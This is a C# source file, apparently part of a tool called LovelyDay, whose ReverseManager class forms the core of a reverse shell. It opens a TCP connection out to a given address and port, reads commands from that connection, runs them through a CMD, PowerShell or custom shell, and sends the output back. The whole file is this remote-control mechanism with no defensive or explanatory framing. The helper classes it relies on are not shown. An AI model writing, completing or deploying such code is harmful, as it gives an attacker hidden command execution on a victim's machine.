﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Diagnostics;

namespace LovelyDay
{
    public enum ShellType
    {
        LovelyDay,
        CMD,
        PowerShell,
        Custom
    }

    public static class ReverseManager
    {
        private static TcpClient ourClient;
        private static Stream ourNetworkStream;
        private static StreamReader ourStreamReader;
        private static StreamWriter ourStreamWriter;
        private static IShell ourShell;

        public static void Initialize(IPAddress aReverseAddress, int aPort, ShellType aShellType = ShellType.CMD)
        {
            ourClient = new TcpClient();
            ourClient.Connect(aReverseAddress, aPort);
            ourNetworkStream = ourClient.GetStream();
            ourStreamReader = new StreamReader(ourNetworkStream);
            ourStreamWriter = new StreamWriter(ourNetworkStream);

            ourShell = ShellFactory.Create(aShellType);
        }

        public static void RunCommand(string aCommand)
        {
            ourShell.RunCommand(aCommand);
        }

        public static string WaitForCommand()
        {
            return ourStreamReader.ReadLine();
        }
        
        public static void OutputHandler(object aSender, DataReceivedEventArgs eventMessage)
        {
            if (!string.IsNullOrEmpty(eventMessage.Data))
            {
                ourStreamWriter.WriteLine("\n" + eventMessage.Data);
                ourStreamWriter.Flush();
            }
        }
    }
}